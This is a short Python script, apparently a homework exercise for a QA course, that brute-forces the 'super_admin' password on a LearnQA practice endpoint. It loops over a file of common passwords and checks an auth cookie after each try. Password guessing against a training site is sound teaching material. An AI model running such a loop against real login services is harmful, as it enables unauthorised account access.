import requests

url_1 = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

# Создание списка паролей за все указанные в Википедии годы
passwords = []
with open('list_passwords.txt', 'r') as f:
    for word in f:
        passwords.append(word[:-1])

# Удаление повторяющихся паролей через преобразование списка в множество
passwords = set(passwords)

# Поиск верного пароля
for elem in passwords:
    response_1 = requests.post(url_1, data={"login": "super_admin", "password": elem})
    cookie_value = response_1.cookies.get("auth_cookie")
    response_2 = requests.post(url_2, cookies={"auth_cookie": cookie_value})
    if response_2.text != "You are NOT authorized":
        print(response_2.text)
        print("Правильный пароль:", response_1.json()["password"])
        break

